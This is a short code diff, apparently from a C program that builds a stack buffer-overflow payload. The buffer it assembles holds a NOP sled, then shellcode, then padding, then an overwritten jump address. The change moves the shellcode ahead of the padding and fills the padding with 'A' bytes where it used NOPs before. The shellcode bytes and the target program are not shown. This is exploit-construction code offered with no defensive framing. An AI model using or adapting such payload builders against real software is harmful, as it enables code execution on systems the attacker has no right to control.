@@ -63,12 +63,12 @@ int main(int argc, char *argv[])
     // add noop instruction
     for (i = 0; i < bsize / 2; i++)
         *(ptr++) = NOP;
-    // add padding
-    for (i = 0; i < (bsize - (bsize / 2) - (shellcode_len)); i++)
-        *(ptr++) = NOP;
-    // add shellcode
+     // add shellcode
     for (i = 0; i < shellcode_len; i++)
         *(ptr++) = shellcode[i];
+    // add padding
+    for (i = 0; i < (bsize - (bsize / 2) - (shellcode_len)); i++)
+        *(ptr++) = 'A';
     
     // add jmo address
     *((unsigned long *)ptr) = addr;
